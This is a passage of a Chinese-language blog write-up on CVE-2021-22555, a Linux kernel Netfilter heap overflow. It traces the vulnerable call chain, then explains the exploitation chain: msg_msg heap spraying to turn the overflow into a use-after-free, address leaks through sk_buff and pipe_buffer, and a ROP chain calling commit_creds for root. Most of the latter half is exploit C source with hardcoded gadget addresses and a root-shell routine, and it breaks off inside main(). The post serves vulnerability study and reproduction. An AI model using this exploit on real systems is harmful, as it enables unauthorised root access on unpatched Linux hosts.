(anquanke.com)](https://www.anquanke.com/post/id/254027#h2-1)\n\n相关的`Netfilter`分析就不做了，也不太会，可以看看`bsauce`师傅的，这里主要关注数据的传输过程的一些东西。\n\n通过`Netfilter`的`setsockopt`系统调用，传入用户数据`&data`，可依据该`&data`中的相关数据进行不同大小的堆块申请。完成申请后，还会对该堆块进行一定的处理，其中就有向堆块末尾填充数据的操作。\n\n```c\nmemset(t->data + target->targetsize, 0, pad);\n```\n\n其中`t->data+target->targetsize`即为申请的堆块上末尾处的某个地址，`pad`为如下定义\n\n```c\npad = XT_ALIGN(target->targetsize) - target->targetsize;\n```\n\n其实`pad`的值即为`8 - (target->targetsize mod 8)`，就是所谓的8字节对齐。\n\n并且`t->data`的地址偏移和`target->targetsize`的值都可被我们直接或间接地控制，那么就可以存在堆块溢出写0的操作了，这里最多溢出4个字节填充为0。\n\n下面是具体的关键函数调用链和相关分析\n\n## 1.nf_setsockopt() \n\n句柄定义\n\n```C\n//v5.11.14 net/ipv4/netfilter/ip_tables.c\nstatic struct nf_sockopt_ops ipt_sockopts = {\n....\n\t.get\t\t= do_ipt_get_ctl,\n....\n};\n```\n\n这样到调用`setsockopt`系统调用时，就会调用到`do_ipt_get_ctl`函数。\n\n## 2.do_ipt_set_ctl()\n\n- 参数：\n\n  ```c\n  (struct sock *sk, int cmd, sockptr_t arg, unsigned int len)\n  ```\n\n  调试如下![image-20220501113945278](https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220501113945278.png)\n\n  这个`&data`即为用户传入的，赋值给`sockptr_t arg`，从而依据`sockptr_t arg`来进行堆块申请和相关的漏洞填充操作。\n\n- 地址：`0xffffffff81b0bd20`\n\n- 介绍：该函数由`nf_sockopt_ops ipt_sockopts`进行句柄定义\n\n  ```c\n  static struct nf_sockopt_ops ipt_sockopts = {\n  ....\n  \t.get\t\t= do_ipt_get_ctl,\n  ....\n  };\n  ```\n\n  即系统调用`setsockopt`实际调用到与漏洞方面有关的最早的函数，传入的`sockptr_targ`即为用户参数`&data`，后续会调用到`compat_do_replace`，传入`sockptr_t arg`\n\n## 3.compat_do_replace() \n\n通过`_copy_from_user`复制`&data`的`0x5c`字节给`tmp`\n\n- 参数：\n\n  ```c\n  (struct net *net, sockptr_t arg, unsigned int len)\n  ```\n\n- 地址：`0xffffffff81b0baf0`\n\n- 介绍：\n\n  - 主要关注变量：\n\n    ```c\n    //传入的\n    sockptr_t arg;\n    \n    //自定义的\n    struct compat_ipt_replace tmp;//保存size\n    struct xt_table_info *newinfo;\n    ```\n\n  调用`translate_compat_table()`，传入本函数定义的`tmp`作为`compatr`，该变量`tmp`由函数`copy_from_sockptr(&tmp, arg, sizeof(tmp))`进行赋值\n\n  - 相关函数链：`copy_from_sockptr->copy_from_sockptr->copy_from_sockptr_offset->copy_from_user`\n\n  ```c\n  //v5.11.14 /include/linux/sockptr.h\n  \n  static inline int copy_from_sockptr_offset(void *dst, sockptr_t src,\n  \t\tsize_t offset, size_t size)\n  {\n  \tif (!sockptr_is_kernel(src))\n  \t\treturn copy_from_user(dst, src.user + offset, size);\n  \tmemcpy(dst, src.kernel + offset, size);\n  \treturn 0;\n  }\n  ```\n\n  这里的`dst`即为`tmp`，`src`即为`arg`，也就是会依据`arg(&data)`的内容来给`tmp`赋值。即最后的`compatr`的来源为上述提到的`sockptr_t arg`，也就是用户传入的参数`&data`。\n\n  从`&data`中复制`0x5c(sizeof(struct compat_ipt_replace))`大小的给到`tmp(compatr)`，如下代码所示\n\n  ```c\n  //v5.11.14 /net/ipv4/netfilter/ip_tables.c\n  static int\n      compat_do_replace(struct net *net, sockptr_t arg, unsigned int len)\n  {\n      //.....\n      if (copy_from_sockptr(&tmp, arg, sizeof(tmp)) != 0)\n          return -EFAULT;\n      ///....\n      //这里的tmp.size即为0xfb6，传入的data.replace.size，也是申请了堆块的。\n      //不过这个堆块不用太过关注，但是这个不能随便设置，不然会在如下检查出错误\n      //然后跳转out_unlock从而无法进入漏洞点\n      /*\n      //translate_compat_table函数中\n      //Walk through entries, checking offsets. \n  \txt_entry_foreach(iter0, entry0, compatr->size) {\n  \t\tret = check_compat_entry_size_and_hooks(iter0, info, &size,\n  \t\t\t\t\t\t\tentry0,\n  \t\t\t\t\t\t\tentry0 + compatr->size);\n  \t\tif (ret != 0)\n  \t\t\tgoto out_unlock;\n  \t\t++j;\n  \t}\n  \n      */\n      //需要注意的是这个newinfo和下面函数中的newinfo不是同一个\n      newinfo = xt_alloc_table_info(tmp.size);\n  \t//......\n      ret = translate_compat_table(net, &newinfo, &loc_cpu_entry, &tmp);\n      //.....\n  }\n  ```\n  \n  复制的这些数据中就包含定义好的size，用来完成之后的堆块申请。\n\n## 4.translate_compat_table()  \n\n- 参数：\n\n  ```c\n  (struct net *net,struct xt_table_info **pinfo,void **pentry0,const struct compat_ipt_replace *compatr)\n  ```\n\n- 地址：`0xffffffff81b0b3e0`\n\n- 介绍：\n\n  - 主要关注变量：\n\n    ```c\n    //传入的\n    const struct compat_ipt_replace *compatr;\n    \n    //自定义的\n    unsigned int size;\n    struct xt_table_info *newinfo;\n    void *pos, *entry1;\n    struct compat_ipt_entry *iter0;\n    ```\n\n  - `size`：`size = compatr->size;`\n\n  - `newinfo`：依据`size`即上述的`compatr->size`申请堆块，漏洞点就出在这个申请的堆块上面。\n\n    ```c\n    translate_compat_table(struct net *net,\n                           struct xt_table_info **pinfo,\n                           void **pentry0,\n                           const struct compat_ipt_replace *compatr)\n    {\n        //.....\n        size = compatr->size;\n        //....\n        //这个堆块就是漏洞堆块了。\n        newinfo = xt_alloc_table_info(size);\n        //.....\n    }\n    ```\n  \n    通过`xt_alloc_table_info`来申请堆块，其中有如下代码\n  \n    ```c\n    //v5.11.14 /net/netfilter/x_tables.c\n    struct xt_table_info *xt_alloc_table_info(unsigned int size)\n    {\n    \tstruct xt_table_info *info = NULL;\n    \tsize_t sz = sizeof(*info) + size;//加上0x40大小\n    \n    \tif (sz < sizeof(*info) || sz >= XT_MAX_TABLE_SIZE)\n    \t\treturn NULL;\n    \t//实际申请的堆块大小为0xffe,即kmalloc-4096，这个堆块就是漏洞堆块了。\n        //结构为struct xt_table_info\n    \tinfo = kvmalloc(sz, GFP_KERNEL_ACCOUNT);\n    \tif (!info)\n    \t\treturn NULL;\n    \n    \tmemset(info, 0, sizeof(*info));\n    \tinfo->size = size;\n    \treturn info;\n    }\n    ```\n  \n    可以看到使用`kvmalloc`，申请标志为`GFP_KERNEL_ACCOUNT`，并且`XT_MAX_TABLE_SIZE`定义如下，也就是在kmalloc-512到kmalloc-8192\n  \n    ```\n    #define XT_MAX_TABLE_SIZE\t(512 * 1024 * 1024)\n    ```\n  \n  - `pos/entry1`：\n  \n    ```c\n    entry1 = newinfo->entries;\n    pos = entry1;\n    ```\n  \n    即`pos/entry1`的值为`newinfo_addr+0x40(0x4*3+0x14+0x14+0x4+0x8)`\n  \n  - 调用如下函数进行下一步：\n  \n    ```c\n    compat_copy_entry_from_user(iter0, &pos, &size,\n    \t\t\t\t\t    newinfo, entry1);\n    ```\n  \n    \n\n\n\n## 5.compat_copy_entry_from_user()\n\n- 参数：\n\n  ```c\n  (struct compat_ipt_entry *e, void **dstptr,\n  \t\t\t    unsigned int *size,\n  \t\t\t    struct xt_table_info *newinfo, unsigned char *base)\n  ```\n\n- 地址：不太清楚\n\n- 介绍：\n\n  - 主要关注变量：\n\n    ```c\n    //传入的\n    //即保存pos的栈地址，值为newinfo->entries(newinfo_addr+0x40)\n    void **dstptr;  \n    unsigned int *size;\n    struct xt_table_info *newinfo;\n    \n    ```\n  \n  - 相关操作：\n\n    ```c\n    compat_copy_entry_from_user(struct compat_ipt_entry *e, void **dstptr,\n                                unsigned int *size,\n                                struct xt_table_info *newinfo, unsigned char *base)\n    {\n        //....\n        //即pos加上0x70，值为newinfo_addr+0x40+0x70\n        *dstptr += sizeof(struct ipt_entry);\n        *size += sizeof(struct ipt_entry) - sizeof(struct compat_ipt_entry);\n        xt_ematch_foreach(ematch, e)\n    \t\txt_compat_match_from_user(ematch, dstptr, size);\n        //.....\n        xt_compat_target_from_user(t, dstptr, size);\n        //.....\n    }\n    ```\n  \n\n\n\n## 6.xt_compat_match_from_user()\n\n这个函数和接下来的漏洞函数`xt_compat_target_from_user`可以说基本一致，观察下图即可看到，具体用来干什么不太清楚，但是作用也是相关的pad填充`newinfo`上的数据。打了一个循环`xt_ematch_foreach`，在我们关注的这个漏洞里，其作用就只是使得`*dstptr + n * msize`，也就是在我们关心的最终值为`newinfo_addr+0x40+0x70+n * msize`，从而使得在进入`xt_compat_target_from_user`之前，`*dstptr`上的堆块地址已经移动到末尾了。\n\n<img src=\"https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214923917.png\" alt=\"image-20220507214923917\" style=\"zoom: 80%;\" />    \t<img src=\"https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214947982.png\" alt=\"image-20220507214947982\" style=\"zoom: 80%;\" />\n\n做了一个数据对比：\n\n```\nnewinfo：\t\t\t\t0xffff888006a2a000\nt：\t\t\t\t\t\t0xffff888006a2afda\nt->data：\t\t\t\t0xffff888006a2affa\ntarget->targetsize：\t\t0x4\ndstptr：\n\txt_compat_match_from_user的时候：\n\t\t0xffffc900002b7ad0->0xffff888006a2a0b0\n\txt_compat_target_from_user的时候：\n\t\t0xffffc900002b7ad0->0xffff888006a2afda\n```\n\n也就是说经过`xt_compat_match_from_user`函数之后，保存在`*dstptr`上的漏洞堆的地址已经加上了`0xf2a`。\n\n\n\n## 6.xt_compat_target_from_user()   \n\n终于来到最后的漏洞函数\n\n- 参数：\n\n  ```c\n  (struct xt_entry_target *t, void **dstptr,\n  \t\t\t\tunsigned int *size)\n  ```\n\n- 地址：`0xFFFFFFFF81A82F75`\n\n- 介绍：\n\n  - 主要关注变量\n\n    ```c\n    //传入的\n    struct xt_entry_target *t;\n    void **dstptr;\n    unsigned int *size;\n    \n    //自定义的\n    const struct xt_target *target = t->u.kernel.target;\n    int pad, off = xt_compat_target_offset(target);\n    ```\n\n  - 相关操作：\n\n    ```c\n    void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,\n    \t\t\t\tunsigned int *size)\n    {\n    \tconst struct xt_target *target = t->u.kernel.target;\n    \tint pad, off = xt_compat_target_offset(target);\n    \t//.....\n        //即获取指针为newinfo+0x40+0x70+0xf2a\n    \tt = *dstptr;\n        //.....\n        //进行8字节对齐\n    \tpad = XT_ALIGN(target->targetsize) - target->targetsize;\n    \tif (pad > 0)\n            //target->targetsize为4，则最终传入的地址为\n            //newinfo+0x40+0x70+0xf2a+0x20+0x4=newinfo+0xffe\n            //同时pad在经过对齐之后也为4,那么就溢出2个字节\n    \t\tmemset(t->data + target->targetsize, 0, pad);\n        //.....\n    \n    }\n    ```\n\n\n\n## 总结\n\n通过上述分析可以看到，其实该漏洞的成因就是\n\n### (1)控制堆块大小和偏移\n\n通过控制传入的`&data`中的`pad`的大小来控制申请的堆块的大小和`t->data`的相对偏移地址\n\n```c\n  struct __attribute__((__packed__)) {\n    struct ipt_replace replace;         // 0x60\n    struct ipt_entry entry;            // 0x70\n    struct xt_entry_match match;         // 0x20\n    char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];     \n    struct xt_entry_target target;      // 0x20\n  } data = {0};\n```\n\n例子：\n\n比如bsauce师傅提供的EXP中的pad如下，这里使用的是`kmalloc-4096`：\n\n```c\nchar pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2]; \n```\n\n那么我们尝试使用`kmalloc-2048`，在代码中减去0x800得到如下：\n\n```c\nchar pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2 - 0x800];\n```\n\n断点打在`xt_alloc_table_info`，在第二次的`xt_alloc_table_info`申请漏洞堆块处，查看下CPU0的`kmalloc-2048`中`freelist`中的堆块。\n\n![image-20220508200120767](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200120767.png)\n\n然后`finish`当前函数，查看rax申请到的堆块，即为`freelist`中的第一个堆块\n\n![image-20220508200155851](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200155851.png)\n\n可以看到是从CP0的`kmalloc-2048`中申请得到的，之后在`call memset`的漏洞点打下断点，按c继续运行，断下来\n\n![image-20220508200407354](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200407354.png)\n\n可以看到仍然还是该漏洞堆块，并且相关的地址也类似的，pad为0x4，所以还是存在漏洞点的。\n\n不过具体的细节有点不太清楚，后续还得补一补`Netfilter`的相关知识。\n\n\n\n### (2)控制填充pad\n\n通过控制传入的`data.target.u.user.revision`来控制`target->targetsize`\n\n```c\ndata.target.u.user.revision = 1;\n```\n\n不同的`version`控制不同的`target->targetsize`。\n\n这里经过我自己的实际调试，感觉bsauce师傅说的有点小问题。漏洞点应该是出在上述的`t->daii`地址没有0x8对齐的时候，并且`target->size`也没有0x8对齐的情况下。\n\n此外，不应该只是2字节溢出，最多应该可以到达4字节溢出，如下设置\n\n```c\nchar pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2 + 0x2]; \n```\n\n这样可以溢出4个字节写0，最终效果如下：\n\n![image-20220508204003227](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508204003227.png)\n\n如果再加pad的话就会导致申请出`kmalloc-8192`的堆块了\n\n\n\n# 二、漏洞利用\n\n## 1.溢出转化UAF\n\n这里涉及到之前提到的`msg_msg`结构体利用。\n\n### (1)堆喷内存布局\n\n首先使用`msgget`申请多个消息队列，然后往每个消息队列发送两条消息，一条主消息`0x1000`，一条辅助消息`0x400`。这里发送消息时需要注意下，先遍历每个队列发送主消息，然后再遍历每个队列发送辅助消息。这样进行堆喷构造后，其中就会有部分的消息队列中的主消息连成一整块地址连续的内存，**辅助消息也需要地址连成一整块，方便后续泄露地址，但是这里为了好看就没有连一起**。比如这里申请三个消息队列，最终形成类似的如下布局\n\n![image-20220513110107919](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110107919.png)\n\n当然这里每条`0x1000`的主消息中还有几个`struct msg_msgseg*`没有画出来\n\n### (2)漏洞溢出构造UAF\n\n这里我们先释放例子中的第二条主消息，虽说在主消息中是由4个`kmalloc(0x400)`申请出来的4个堆块，但是如果都释放之后，内存的回收机制发现这四个地址连续且都被释放，那么就会归并成一页`page`还给`Slub`分配器，其实就是`kmalloc-4096`。（里面算法很复杂，不是很懂，后面再来理清楚。）之后再申请`0x1000`大小的堆块，就会优先从这里取。\n\n![image-20220513110346186](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110346186.png)\n\n然后我们使用漏洞，调用`socketopt`来申请一个`0x1000`的`xt_table_info`，就会占据到我们刚刚释放的`0x1000`大小的堆块上。(这个前面我们分析`socketopt`会申请两个`0x1000`大小的堆块，那么我们之后就是多释放几条主消息即可)这样在占据之后，发生2字节溢出写0，就可以溢出到下一个消息队列的`msg_msg`头部结构的`struct list_head m_list.next`指针，从而使得其指向其他位置，如果运气好的话，由于辅助消息也是堆喷形式，且大小为`0x400`，那么溢出两字节写0就可能将该`next`指针指向其他的辅助消息，从而造成两个消息队列中共存一个辅助消息。\n\n![image-20220513110927931](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110927931.png)\n\n比如图中消息队列3中的主消息头部的`struct list_head m_list.next`即被修改(黑色为溢出2字节写0)，如红色箭头所示指向了消息队列1中的辅助消息，这样消息队列1和消息队列3都指向了同一个辅助消息，构成了堆块`overlap`。之后我们释放消息队列1中的辅助消息，而消息队列3仍然指向该辅助消息，构成了UAF。\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513111337456.png)\n\n🔺注：在实际的利用里，需要进行堆喷布局，申请很多的消息队列，这时候就需要用`MSG_COPY`标志位来进行消息读取。利用此标志位读取消息但不释放堆块，然后借助发送消息时自己留下的索引标志来判断到底是哪个辅助消息被两个消息队列所包含，这样就能进行后续的利用。\n\n## 2.利用UAF\n\n### (1)泄露堆地址\n\n首先使用`sk_buff`的`data`数据块来占据该`UAF`堆块。前面提到`sk_buff`的结构头使用独有的缓冲池`kache`来申请，但是其`data`数据块还是使用`kmalloc`常规路线来申请释放(使用正常的发包收包即可完成申请释放)，并且`size`和`data`内容完全可控，这样我们就可以完全控制该`UAF`堆块。\n\n之后伪造一个`fake_msg_msg`结构体，结构如下\n\n![image-20220513112451162](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513112451162.png)\n\n```c\n//v5.11 /include/linux/msg.h\nstruct msg_msg {\n\tstruct list_head m_list;//与msg_queue或者其他的msg_msg组成双向循环链表\n\tlong m_type;\n\tsize_t m_ts;\t\t/* message text size */\n\tstruct msg_msgseg *next;//单向链表，指向该条信息后面的msg_msgseg\n\tvoid *security;\n\t/* the actual message follows immediately */\n};\n```\n\n改大其`m_ts`域，就可以读取出消息队列2的辅助消息头部指针`struct list_head m_list.next`的值，从而泄露消息队列2的`msg_msg_queue`的`struct list_head m_list`域的地址，为一个堆地址。\n\n之后我们修改`fake_msg_msg`的`struct msg_msgseg *next`指针，指向上述获得的消息队列2的`struct list_head m_list`域的地址，就能读出该`struct list_head m_list`域的`prev`指针，即为消息队列2的辅助消息的地址，减去`0x400`即为`UAF`堆块的地址\n\n### (2)泄露内核基地址\n\n接下来利用到`pipe`管道，主要是其中`struct pipe_inode_info`的`struct pipe_buffer *bufs;`数组，总大小为`0x280`，使用`kmalloc-1024`，满足当前的`UAF`（同样使用正常的`read/write`即可完成申请释放）。其结构为\n\n```c\n//v5.11.14 /include/linux/pipe_fs_i.h\nstruct pipe_buffer {\n\tstruct page *page;\n\tunsigned int offset, len;\n\tconst struct pipe_buf_operations *ops;\n\tunsigned int flags;\n\tunsigned long private;\n};\n```\n\n利用如下操作读取`const struct pipe_buf_operations *ops;`指针，即可泄露内核基地址\n\n- 利用 `sk_buff` 修复`UAF`处的辅助消息，之后从消息队列中接收该辅助消息，此时该`UAF`对象重回 `slub`的`kmalloc-1024`的`freelist`中，但 `sk_buff` 仍指向该`UAF`对象\n- 喷射 `pipe_buffer`，就会将该`UAF`对象申请回来，将`pipe_buffer`写入到该`UAF`对象上，之后再接收 `sk_buff` 数据包，即可获取`pipe_buffer`上的数据，得到`const struct pipe_buf_operations *ops;`指针，即可泄露内核基地址\n\n![image-20220513115154194](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513115154194.png)\n\n### (3)劫持程序执行流\n\n之前也提到过，当我们关闭管道`pipe`两端或者从管道`pipe`中读取出所有数据之后，会调用到`pipe_buf_release()`函数进行清理，其中会调用`struct pipe_buffer *bufs;`下的`const struct pipe_buf_operations *ops;`对应函数表中的`release`函数指针。\n\n```c\nstatic inline void pipe_buf_release(struct pipe_inode_info *pipe,\n\t\t\t\t    struct pipe_buffer *buf)\n{\n\tconst struct pipe_buf_operations *ops = buf->ops;\n\n\tbuf->ops = NULL;\n\tops->release(pipe, buf);\n}\n```\n\n现在我们就可以通过`sk_buff`来劫持劫持`ops`指针函数表，修改其中的`release`函数指针，完成劫持程序流。并且此时的`rsi`即为`buf`为我们的`UAF`对象，而`sk_buff`又可以使得`UAF`对象里的数据完全可控。如果找到一个可以将`rsp`劫持为`rsi`的`gadget`，那么就可以完全操控程序流程了。\n\n## 3.EXP解析\n\n这个其实也没有什么好讲的，看懂漏洞利用过程其实也很容易写出来的，主要提一下某些比较偏的知识点，也防止忘记。\n\n### (1)绑定CPU分配\n\n通常是用来进行堆块分配时查看堆块内存的，防止堆块申请的时候东一个西一个的，方便调试，同时也是为了提高堆喷射的稳定性\n\n```c\n//bind the cpu0\ncpu_set_t set;\nCPU_ZERO(&set);\nCPU_SET(0, &set);\nif (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {\n    perror(\"[-] sched_setaffinity\");\n    return -1;\n}\n```\n\n### (2)命名空间\n\n```c\nint setup_sandbox(void) {\n  if (unshare(CLONE_NEWUSER) < 0) {\n    perror(\"[-] unshare(CLONE_NEWUSER)\");\n    return -1;\n  }\n  if (unshare(CLONE_NEWNET) < 0) {\n    perror(\"[-] unshare(CLONE_NEWNET)\");\n    return -1;\n  }\n}\n```\n\n`EXP`原作者称：当`IPT_SO_SET_REPLACE`或`IP6T_SO_SET_REPLACE`在兼容模式下被调用时（需要`CAP_NET_ADMIN`权限）。\n\n这个在源代码`do_ipt_set_ctl()`函数中有所体现\n\n```c\n//v5.11.14 /net/ipv4/netfilter/ip_tables.c\nstatic int\ndo_ipt_set_ctl(struct sock *sk, int cmd, sockptr_t arg, unsigned int len)\n{\n\tint ret;\n\t//提到当兼容模式下需要CAP_NET_ADMIN权限\n\tif (!ns_capable(sock_net(sk)->user_ns, CAP_NET_ADMIN))\n\t\treturn -EPERM;\n    //....\n\treturn ret;\n}\n```\n\n而用户空间隔离出独立的命名空间后就能拥有`CAP_NET_ADMIN`权限，所以需要，其实也不是太懂这个干啥的。\n\n其他的好像也没有什么了，就是最后的`ROP`链条方面的东西，由于最后触发劫持程序流的时候，`rsi`为`UAF`对象地址，所以利用`gadget`先进行栈劫持`rsp`，然后使用利用`commit_creds(&init_cred)`获取ROOT权限，之后使用`SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE`绕过`KPTI`和`SMEP`即可。\n\n参考：[【CVE.0x07】CVE-2021-22555 漏洞复现及简要分析 - arttnba3's blog](https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT)\n\n[Linux Kernel KPTI保护绕过 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/240006)\n\n### (3)最终EXP\n\n主要是[bsauce师傅的EXP](https://github.com/bsauce/kernel-exploit-factory)和[arttnba3师傅的EXP](https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT)，然后改巴改巴，加了点东西，替换了一下ROP链条什么的。\n\n```c\n//compile exp: $ gcc -m32 -static -masm=intel -o exploit exploit.c\n#define _GNU_SOURCE\n#include <err.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <inttypes.h>\n#include <sched.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <net/if.h>\n#include <netinet/in.h>\n#include <sys/ipc.h>\n#include <sys/msg.h>\n#include <sys/socket.h>\n#include <sys/syscall.h>\n#include <linux/netfilter_ipv4/ip_tables.h>\n\n// clang-format on\n#define PAGE_SIZE 0x1000\n#define PRIMARY_SIZE 0x1000\n#define SECONDARY_SIZE 0x400\n\n#define NUM_SOCKETS 4\n#define NUM_SKBUFFS 128\n#define NUM_PIPEFDS 256\n#define NUM_MSQIDS 4096\n\n#define HOLE_STEP 1024\n\n#define MTYPE_PRIMARY 0x41\n#define MTYPE_SECONDARY 0x42\n#define MTYPE_FAKE 0x1337\n\n#define MSG_TAG 0xAAAAAAAA\n\n//Gadget \n#define PUSH_RSI_JMP_RSI_0x2E 0xffffffff81b4e244\n#define ADD_RSP_0x98_RET 0xffffffff81a7895e\n#define POP_RSP_RET 0xffffffff81900644\n#define POP_RDI_RET 0xffffffff81001629\n#define INIT_CRED 0xffffffff8244c8a0\n#define COMMIT_CREDS 0xffffffff8108e690\n#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00df0\n\n#define ANON_PIPE_BUF_OPS 0xffffffff82019340\n\n//pt_regs\nsize_t user_cs, user_ss, user_sp, user_eflags;\n\n\n// clang-format on\n#define SKB_SHARED_INFO_SIZE 0x140\n#define MSG_MSG_SIZE (sizeof(struct msg_msg))\n#define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))\n\n//some struct\nstruct msg_msg {\n  uint64_t m_list_next;\n  uint64_t m_list_prev;\n  uint64_t m_type;\n  uint64_t m_ts;\n  uint64_t next;\n  uint64_t security;\n};\n\nstruct msg_msgseg {\n  uint64_t next;\n};\n\nstruct pipe_buffer {\n  uint64_t page;\n  uint32_t offset;\n  uint32_t len;\n  uint64_t ops;\n  uint32_t flags;\n  uint32_t pad;\n  uint64_t private;\n};\n\nstruct pipe_buf_operations {\n  uint64_t confirm;\n  uint64_t release;\n  uint64_t steal;\n  uint64_t get;\n};\n\nstruct {\n  long mtype;\n  char mtext[PRIMARY_SIZE - MSG_MSG_SIZE];\n} msg_primary;\n\nstruct {\n  long mtype;\n  char mtext[SECONDARY_SIZE - MSG_MSG_SIZE];\n} msg_secondary;\n\nstruct {\n  long mtype;\n  char mtext[PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE];\n} msg_fake;\n\nvoid build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,\n                   uint64_t m_list_prev, uint64_t m_ts, uint64_t next) {\n  msg->m_list_next = m_list_next;\n  msg->m_list_prev = m_list_prev;\n  msg->m_type = MTYPE_FAKE;\n  msg->m_ts = m_ts;\n  msg->next = next;\n  msg->security = 0;\n}\n\nvoid getRootShell(void)\n{\n    if (getuid())\n    {\n      printf(\"failed to gain the root!\\n\");\n      exit(0);\n    }\n    printf(\"\\033[32m\\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\\033[0m\\n\");\n    system(\"/bin/sh\");\n}\n\nvoid saveStatus()\n{\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, esp;\"\n            \"pushf;\"\n            \"pop user_eflags;\"\n            );\n    printf(\"\\033[34m\\033[1m[*] Status has been saved.\\033[0m\\n\");\n}\n\n\nint write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp) {\n  *(long *)msgp = msgtyp;\n  if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) < 0) {\n    perror(\"[-] msgsnd\");\n    return -1;\n  }\n  return 0;\n}\n\nint peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {\n  if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT) <\n      0) {\n    perror(\"[-] msgrcv\");\n    return -1;\n  }\n  return 0;\n}\n\nint read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {\n  if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0) < 0) {\n    perror(\"[-] msgrcv\");\n    return -1;\n  }\n  return 0;\n}\n\nint spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) {\n  for (int i = 0; i < NUM_SOCKETS; i++) {\n    for (int j = 0; j < NUM_SKBUFFS; j++) {\n      if (write(ss[i][0], buf, size) < 0) {\n        perror(\"[-] write\");\n        return -1;\n      }\n    }\n  }\n  return 0;\n}\n\nint free_skbuff(int ss[NUM_SOCKETS][2], void *buf, size_t size) {\n  for (int i = 0; i < NUM_SOCKETS; i++) {\n    for (int j = 0; j < NUM_SKBUFFS; j++) {\n      if (read(ss[i][1], buf, size) < 0) {\n        perror(\"[-] read\");\n        return -1;\n      }\n    }\n  }\n  return 0;\n}\n\nint trigger_oob_write(int s) {\n  struct __attribute__((__packed__)) {\n    struct ipt_replace replace;                     // 0x60\n    struct ipt_entry entry;                         // 0x70\n    struct xt_entry_match match;                    // 0x20\n    char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];   //  kvmalloc_size = sizeof(xt_table_info) + ipt_replace->size =  0x40 + (0xFB8 - 0x2) = 0xFF8 - 0x2\n    struct xt_entry_target target;                  // 0x20\n  } data = {0};\n\n  data.replace.num_counters = 1;\n  data.replace.num_entries = 1;\n  data.replace.size = (sizeof(data.entry) + sizeof(data.match) +\n                       sizeof(data.pad) + sizeof(data.target));             // 0x70 + (0x108+0x1000-0x200-0x2) + 0x20 + 0x20 = 0xFB8 - 0x2\n\n  data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) +\n                            sizeof(data.pad) + sizeof(data.target));        // Size of ipt_entry + matches + target\n  data.entry.target_offset =\n      (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad));         // Size of ipt_entry + matches\n\n  data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad));   // 0x20 + (0x108+0x1000-0x200-0x2) = 0xF28 - 0x2\n  strcpy(data.match.u.user.name, \"icmp\");\n  data.match.u.user.revision = 0;\n\n  data.target.u.user.target_size = sizeof(data.target);                     // 0x20\n  strcpy(data.target.u.user.name, \"NFQUEUE\");\n  data.target.u.user.revision = 1;\n  getchar();\n\n  // Partially overwrite the adjacent buffer with 2 bytes of zero.\n  if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)) != 0) {\n    if (errno == ENOPROTOOPT) {\n      printf(\"[-] Error ip_tables module is not loaded.\\n\");\n      return -1;\n    }\n  }\n\n  return 0;\n}\n\n\nint setup_sandbox(void) {\n  if (unshare(CLONE_NEWUSER) < 0) {\n    perror(\"[-] unshare(CLONE_NEWUSER)\");\n    return -1;\n  }\n  if (unshare(CLONE_NEWNET) < 0) {\n    perror(\"[-] unshare(CLONE_NEWNET)\");\n    return -1;\n  }\n\n  //bind the cpu0\n  cpu_set_t set;\n  CPU_ZERO(&set);\n  CPU_SET(0, &set);\n  if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {\n    perror(\"[-] sched_setaffinity\");\n    return -1;\n  }\n\n  return 0;\n}\n\nint main(int argc, char *argv[]) {\n  int s;\n  int fd;\n  int ss[NUM_SOCKETS][2];\n  int pipefd[NUM_PIPEFDS][2];\n  int msqid[NUM_MSQIDS];\n  uint64_t    *rop_chain;\n\n  char primary_buf[PRIMARY_SIZE - SKB_SHARED_INFO_SIZE];\n  char secondary_buf[SECONDARY_SIZE - SKB_SHARED_INFO_SIZE];\n\n  struct msg_msg *msg;\n  struct pipe_buf_operations *fake_pipe_buffer_ops;\n  struct pipe_buffer *fake_pipe_buffer;\n\n 